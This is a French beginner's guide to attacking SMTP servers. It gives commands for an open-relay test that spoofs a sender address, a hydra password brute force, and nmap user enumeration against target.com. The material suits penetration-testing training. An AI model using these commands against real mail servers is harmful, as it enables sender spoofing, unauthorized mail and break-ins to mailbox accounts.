# Exploitation SMTP

## Objectif
Exploiter des faiblesses de configuration ou des mots de passe faibles pour envoyer des mails non autorisés ou accéder à des boîtes mail.

---

## Explications vulgarisées
- SMTP est le protocole d'envoi de mails. Il peut être mal configuré (relai ouvert, mots de passe faibles, accès non chiffré).
- L'exploitation consiste à envoyer des mails non autorisés, à usurper une identité ou à accéder à des boîtes mail.

---

## Commandes et étapes essentielles

### 1. Test de relai ouvert
```bash
telnet target.com 25
MAIL FROM: test@attacker.com
RCPT TO: victim@target.com
DATA
Subject: Test
Ceci est un test
.
QUIT
```
- **Astuce débutant** : Si le serveur accepte d'envoyer le mail, il est vulnérable au relai ouvert.

### 2. Bruteforce de mots de passe
```bash
hydra -L users.txt -P passwords.txt smtp://target.com
```
- **hydra** : Outil de bruteforce pour tester des combinaisons utilisateurs/mots de passe.

### 3. Exploitation automatisée avec Nmap
```bash
nmap --script smtp-enum-users -p 25 target.com
```
- **smtp-enum-users** : Script Nmap pour tester des noms d'utilisateurs courants.

---

## Conseils pour débutants
- Toujours commencer par tester le relai ouvert avant d'essayer des credentials.
- Tester des credentials faibles ou par défaut avant d'essayer des listes longues.
- Utiliser Nmap pour automatiser la détection de comptes valides.
- Lire la documentation de chaque outil pour découvrir des options avancées.

---

## Pour aller plus loin
- [PayloadsAllTheThings - SMTP Exploitation](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Methodology%20and%20Resources/SMTP%20Methodology)
- [Nmap SMTP NSE Scripts](https://nmap.org/nsedoc/categories/smtp.html) 